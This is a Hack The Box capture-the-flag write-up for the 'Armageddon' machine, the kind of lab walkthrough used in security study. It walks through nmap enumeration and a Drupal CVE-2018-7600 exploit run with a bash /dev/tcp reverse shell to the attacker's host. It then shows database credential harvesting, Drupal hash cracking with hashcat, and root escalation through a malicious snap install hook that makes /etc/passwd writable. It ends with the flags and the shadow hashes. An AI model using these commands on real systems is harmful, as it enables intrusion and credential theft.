# Armageddon Hackthebox Writeup

## All Ports
```bash
# Nmap 7.91 scan initiated Sat Jun 12 14:12:20 2021 as: nmap -sT -vv -oA nmap/allports 10.10.10.233
Nmap scan report for 10.10.10.233
Host is up, received reset ttl 63 (0.27s latency).
Scanned at 2021-06-12 14:12:20 EDT for 12s
Not shown: 998 closed ports
Reason: 998 conn-refused
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sat Jun 12 14:12:32 2021 -- 1 IP address (1 host up) scanned in 12.33 seconds
```

## Complete Scan

```bash
# Nmap 7.91 scan initiated Sat Jun 12 13:14:26 2021 as: nmap -sT -sV -sC -A -vv -p22,80 -oA nmap/complete 10.10.10.233
Nmap scan report for 10.10.10.233
Host is up, received reset ttl 63 (0.27s latency).
Scanned at 2021-06-12 13:14:28 EDT for 23s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDC2xdFP3J4cpINVArODYtbhv+uQNECQHDkzTeWL+4aLgKcJuIoA8dQdVuP2UaLUJ0XtbyuabPEBzJl3IHg3vztFZ8UEcS94KuWP09ghv6fhc7JbFYONVJTYLiEPD8nrS/V2EPEQJ2ubNXcZAR76X9SZqt11JTyQH/s6tPH+m3m/84NUU8PNb/dyhrFpCUmZzzJQ1zCDStLXJnCAOE7EfW2wNm1CBPCXn1wNvO3SKwokCm4GoMKHSM9rNb9FjGLIY0nq+8mt7RTJZ+WLdHsje3AkBk1yooGFF+0TdOj42YK2OtAKDQBWnBm1nqLQsmm/Va9T2bPYLLK5aUd4/578u7h
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBE4kP4gQ5Th3eu3vz/kPWwlUCm+6BSM6M3Y43IuYVo3ppmJG+wKiabo/gVYLOwzG7js497Vr7eGIgsjUtbIGUrY=
|   256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG9ZlC3EA13xZbzvvdjZRWhnu9clFOUe7irG8kT0oR4A
80/tcp open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
|_http-generator: Drupal 7 (http://drupal.org)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 36 disallowed entries 
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
| /LICENSE.txt /MAINTAINERS.txt /update.php /UPGRADE.txt /xmlrpc.php 
| /admin/ /comment/reply/ /filter/tips/ /node/add/ /search/ 
| /user/register/ /user/password/ /user/login/ /user/logout/ /?q=admin/ 
| /?q=comment/reply/ /?q=filter/tips/ /?q=node/add/ /?q=search/ 
|_/?q=user/password/ /?q=user/register/ /?q=user/login/ /?q=user/logout/
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: Welcome to  Armageddon |  Armageddon
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 3.2 - 4.9 (95%), Linux 3.16 (95%), Linux 3.18 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.1 (93%), Linux 3.2 (93%), Linux 3.10 - 4.11 (93%), Linux 3.12 (93%), Linux 3.13 (93%), Linux 3.13 - 3.16 (93%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.91%E=4%D=6/12%OT=22%CT=%CU=39618%PV=Y%DS=2%DC=T%G=N%TM=60C4EB8B%P=x86_64-pc-linux-gnu)
SEQ(SP=102%GCD=1%ISR=10B%TI=Z%CI=I%II=I%TS=A)
SEQ(SP=102%GCD=1%ISR=10B%TI=Z%II=I%TS=A)
OPS(O1=M54DST11NW7%O2=M54DST11NW7%O3=M54DNNT11NW7%O4=M54DST11NW7%O5=M54DST11NW7%O6=M54DST11)
WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)
ECN(R=Y%DF=Y%T=40%W=7210%O=M54DNNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)
T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)
U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)
IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 0.113 days (since Sat Jun 12 10:31:36 2021)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=258 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   268.20 ms 10.10.14.1
2   268.35 ms 10.10.10.233

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 12 13:14:51 2021 -- 1 IP address (1 host up) scanned in 24.94 seconds
```

## Port 80 Enumeration

Nothing more only default login page.

![](Images/Pasted%20image%2020210612132020.png)

```java
┌─[R4hn1]─[10.10.14.45]─[root@V0ld3rm0rt]─[~/Walkthrough/HTB/Armageddon]
└────╼ # whatweb http://10.10.10.233/
http://10.10.10.233/ [200 OK] Apache[2.4.6], Content-Language[en], Country[RESERVED][ZZ], Drupal, HTTPServer[CentOS][Apache/2.4.6 (CentOS) PHP/5.4.16], IP[10.10.10.233], JQuery, MetaGenerator[Drupal 7 (http://drupal.org)], PHP[5.4.16], PasswordField[pass], PoweredBy[Arnageddon], Script[text/javascript], Title[Welcome to  Armageddon |  Armageddon], UncommonHeaders[x-content-type-options,x-generator], X-Frame-Options[SAMEORIGIN], X-Powered-By[PHP/5.4.16]
```


Searched for exploit and got it on Github

```bash
https://github.com/pimps/CVE-2018-7600
```

![](Images/Pasted%20image%2020210612132541.png)

And time to get reverse shell

```java
# python3 drupa7-CVE-2018-7600.py http://10.10.10.233/ -c "bash -c '/bin/bash -i >& /dev/tcp/10.10.14.45/443 0>&1'"
```
![](Images/Pasted%20image%2020210612132717.png)

## Priv Esec

```java
bash-4.2$ grep -Ri password .
```

```sql
$databases = array (
  'default' => 
  array (
    'default' => 
    array (
      'database' => 'drupal',
      'username' => 'drupaluser',
      'password' => 'CQHEy@9M*m23gBVj',
      'host' => 'localhost',
      'port' => '',
      'driver' => 'mysql',
      'prefix' => '',
    ),
  ),
);

```

here we got a db credentials.

```java
Import Mysql Data :
bash-4.2$ mysql -udrupaluser -pCQHEy@9M*m23gBVj -e 'show databases;'
bash-4.2$ mysql -udrupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; show tables;'
bash-4.2$ mysql -udrupaluser -pCQHEy@9M*m23gBVj -e 'use drupal; select * from users;'
```

```bash
uid	name	pass	mail	theme	signature	signature_format	created	access	login	status	timezone	language	picture	init	data
0						NULL	0	0	0	0	NULL		0		NULL
1	brucetherealadmin	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt	admin@armageddon.eu			filtered_html	1606998756	1607077194	1607076276	1	Europe/London		0	admin@armageddon.eu	a:1:{s:7:"overlay";i:1;}
```

here we got creds.

Now time to crack the hash

```java
# hashid -m '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
	Analyzing '$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt'
	[+] Drupal > v7.x [Hashcat Mode: 7900]
	
# vim hash.txt
	$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt
	
# hashcat -m 7900 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

![](Images/Pasted%20image%2020210612134523.png)

```bash
Credentials : 
Username : brucetherealadmin
Password : booboo
```

And here we got a user,

Let's look for root.

![](Images/Pasted%20image%2020210612134734.png)

We've a permission to run /usr/bin/snap as root

So i created a simple script to genrate custome snap package

```bash
#!/bin/bash

COMMAND='chmod 777 /etc/passwd'
mkdir -p meta/hooks
printf '#!/bin/sh\n%s; false' "$COMMAND" >meta/hooks/install
chmod +x meta/hooks/install
fpm -n rootme -s dir -t snap -a all meta
```

Need to install fp package before running it.

```java
# apt-get install ruby ruby-dev rubygems build-essential
# gem install --no-document fpm
```

Scripts created a custome snap package to set suid bit on /bin/bash

```java
Exploit Method : 
Attacker PC : 
# bash rootme.sh
# scp rootme_1.0_all.snap brucetherealadmin@10.10.10.233:/home/brucetherealadmin
# openssl passwd 123
[Add Openssl genrated password entry in /etc/passwd]

Server : 
[brucetherealadmin@armageddon ~]$ sudo /usr/bin/snap install rootme_1.0_all.snap --dangerous --devmode
[brucetherealadmin@armageddon ~]$ ls -lha /etc/passwd
```

```bash
User Flag : f41ec519d2a723b5328354c341fa739c
Root FLag : 61269e73a3682adc1eb9a45061a1ea74

Hash : 
root:$6$OhKUwkvR$.uL.mlYJOz.ubK/FmXouGbU7vCVCG9s00K7R.ny9ryM.vXNdwZhOGCcq7e3XcbA5UpqUp.9eKY4hfLy9m5aU7/:18610:0:99999:7:::
brucetherealadmin:$6$zuzXrozM$owg1fTqFLp1pv7E6rQ.YFmVaQ7Ux5UL5c6IeGNxmYys2ClAkyULCmMUbFw6kTh8Al0nAUg1/TlDteRkjSxkp10:18599:0:99999:7:::
```